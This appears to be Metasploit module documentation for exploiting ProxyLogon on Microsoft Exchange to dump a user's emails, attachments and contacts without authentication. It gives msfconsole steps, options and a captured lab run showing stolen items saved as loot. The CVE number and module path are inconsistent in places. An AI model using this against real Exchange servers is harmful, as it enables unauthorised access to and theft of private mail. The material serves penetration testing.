## Vulnerable Application

CVE-2021-28855 is a pre-authentication SSRF (Server Side Request Forgery) which allows an attacker to
bypass authentication by sending specially crafted HTTP requests. This vulnerability is part of an attack
chain used to perform an RCE (Remote Code Execution).

This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 15.01.2106.013,
Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

### Introduction

This module exploit a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the
authentication and impersonating as the admin (CVE-2021-26855).

By taking advantage of this vulnerability, it is possible to dump all mailboxes (emails, attachments,
contacts, ...).

All components are vulnerable by default.

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/gather/exchange_proxylogon`
3. Do: `set RHOSTS [IP]`
4. Do: `set EMAIL [EMAIL ADDRESS]`
5. Do: `run`

## Options

### ATTACHMENTS

Dump documents attached to an email. Default: true

### EMAIL

The email account what you want dump.

### FOLDER

The email folder what you want dump. Default: inbox

It is also possible to use other attributes such as: drafts, sentitems, ...

More info about this in the references.

### METHOD

HTTP Method to use for the check (only). Default: POST

### TARGET

Force the name of the internal Exchange server targeted.

## Advanced Options

### MaxEntries

Override the maximum number of object to dump.

## Auxiliary Actions

### Dump (Contacts)

Dump user contacts from exchange server.

### Dump (Emails)

Dump user emails from exchange server.

## Scenarios

```
msf6 auxiliary(gather/exchange_proxylogon_collector) > options 

Module options (auxiliary/gather/exchange_proxylogon_collector):

   Name         Current Setting           Required  Description
   ----         ---------------           --------  -----------
   ATTACHMENTS  true                      yes       Dump documents attached to an email
   EMAIL        gaston.lagaffe@pwned.lab  yes       The email account what you want dump
   FOLDER       inbox                     yes       The email folder what you want dump
   METHOD       POST                      yes       HTTP Method to use for the check (only). (Accepted: GET, POST)
   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       172.20.2.110              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        443                       yes       The target port (TCP)
   SSL          true                      no        Negotiate SSL/TLS for outgoing connections
   TARGET                                 no        Force the name of the internal Exchange server targeted
   VHOST                                  no        HTTP server virtual host


Auxiliary action:

   Name           Description
   ----           -----------
   Dump (Emails)  Dump user emails from exchange server


msf6 auxiliary(gather/exchange_proxylogon_collector) > run
[*] Running module against 172.20.2.110

[*] https://172.20.2.110:443 - Attempt to exploit for CVE-2021-26855
[*]  * internal server name (EXCH2K16)
[*] https://172.20.2.110:443 - Sending autodiscover request
[*]  * Server: d8a7cc8c-7180-4b80-b53e-57c3449bcd4e@pwned.lab
[*]  * LegacyDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=9b9d8cf634f44ec4a0eda5c1c7c311da-Gasto
[*] https://172.20.2.110:443 - Sending mapi request
[*]  * sid: S-1-5-21-3756917241-677735496-3570881102-1141 (gaston.lagaffe@pwned.lab)
[*] https://172.20.2.110:443 - Selecting the first internal server found
[*]  * targeting internal: server2
[*] https://172.20.2.110:443 - Attempt to dump emails for <gaston.lagaffe@pwned.lab>
[*]  * successfuly connected to: inbox
[*]  * selected folder: inbox (AQAYAGdhc3Rvbi5sYWdhZmYAZUBwd25lZC5sYWIALgAAA+uQmQIqiSJLiXyYWVYT65MBACRuvwACXEpAuhG13iUjVgwAAAIBDAAAAA==)
[*]  * number of email found: 4
[*] https://172.20.2.110:443 - Processing dump of 4 items
[*]  * download item: CQAAABYAAAAkbr8AAlxKQLoRtd4lI1YMAAAA6ItL
[+]  * file saved to /home/mekhalleh/.msf4/loot/20210312120226_default_172.20.2.110_gaston.lagaffep_455715.txt
[*]    -> attachment: AAAYAGdhc3Rvbi5sYWdhZmZlQHB3bmVkLmxhYgBGAAAAAADrkJkCKokiS4l8mFlWE+uTBwAkbr8AAlxKQLoRtd4lI1YMAAAAAAEMAAAkbr8AAlxKQLoRtd4lI1YMAAAA6IA6AAABEgAQAFejlEQ+wzFDoBLnyMUbSk4= (Messagerie - Administrator - Outlook.pdf)
[+]  * file saved to /home/mekhalleh/.msf4/loot/20210312120226_default_172.20.2.110_gaston.lagaffep_392827.pdf
[*]    -> attachment: AAAYAGdhc3Rvbi5sYWdhZmZlQHB3bmVkLmxhYgBGAAAAAADrkJkCKokiS4l8mFlWE+uTBwAkbr8AAlxKQLoRtd4lI1YMAAAAAAEMAAAkbr8AAlxKQLoRtd4lI1YMAAAA6IA6AAABEgAQAAZVIXO5iaNNtJIokpS4aB4= (03.png)
[+]  * file saved to /home/mekhalleh/.msf4/loot/20210312120226_default_172.20.2.110_gaston.lagaffep_187857.png
[*] 
[*]  * download item: CQAAABYAAAAkbr8AAlxKQLoRtd4lI1YMAAAA6ItK
[+]  * file saved to /home/mekhalleh/.msf4/loot/20210312120226_default_172.20.2.110_gaston.lagaffep_470603.txt
[*] 
[*]  * download item: CQAAABYAAAAkbr8AAlxKQLoRtd4lI1YMAAAAAAEc
[+]  * file saved to /home/mekhalleh/.msf4/loot/20210312120226_default_172.20.2.110_gaston.lagaffep_296938.txt
[*] 
[*]  * download item: CQAAABYAAAAkbr8AAlxKQLoRtd4lI1YMAAAAAAEX
[+]  * file saved to /home/mekhalleh/.msf4/loot/20210312120226_default_172.20.2.110_gaston.lagaffep_524052.txt
[*] 
[*] Auxiliary module execution completed
msf6 auxiliary(gather/exchange_proxylogon_collector) > set action Dump\ (Contacts) 
action => Dump (Contacts)
msf6 auxiliary(gather/exchange_proxylogon_collector) > run
[*] Running module against 172.20.2.110

[*] https://172.20.2.110:443 - Attempt to exploit for CVE-2021-26855
[*]  * internal server name (EXCH2K16)
[*] https://172.20.2.110:443 - Sending autodiscover request
[*]  * Server: d8a7cc8c-7180-4b80-b53e-57c3449bcd4e@pwned.lab
[*]  * LegacyDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=9b9d8cf634f44ec4a0eda5c1c7c311da-Gasto
[*] https://172.20.2.110:443 - Sending mapi request
[*]  * sid: S-1-5-21-3756917241-677735496-3570881102-1141 (gaston.lagaffe@pwned.lab)
[*] https://172.20.2.110:443 - Selecting the first internal server found
[*]  * targeting internal: server2
[*] https://172.20.2.110:443 - Attempt to dump contacts for <gaston.lagaffe@pwned.lab>
[*]  * successfuly connected to: contacts
[*]  * selected folder: contacts (AQAYAGdhc3Rvbi5sYWdhZmYAZUBwd25lZC5sYWIALgAAA+uQmQIqiSJLiXyYWVYT65MBACRuvwACXEpAuhG13iUjVgwAAAIBDgAAAA==)
[*]  * number of contact found: 1
[*] https://172.20.2.110:443 - Processing dump of 1 items
[+]  * file saved to /home/mekhalleh/.msf4/loot/20210312120243_default_172.20.2.110_gaston.lagaffep_160567.txt
[*] Auxiliary module execution completed
msf6 auxiliary(gather/exchange_proxylogon_collector) > 
```

## References

1. <https://proxylogon.com/>
2. <https://aka.ms/exchangevulns>
3. <https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/distinguishedfolderid>
4. <https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py>
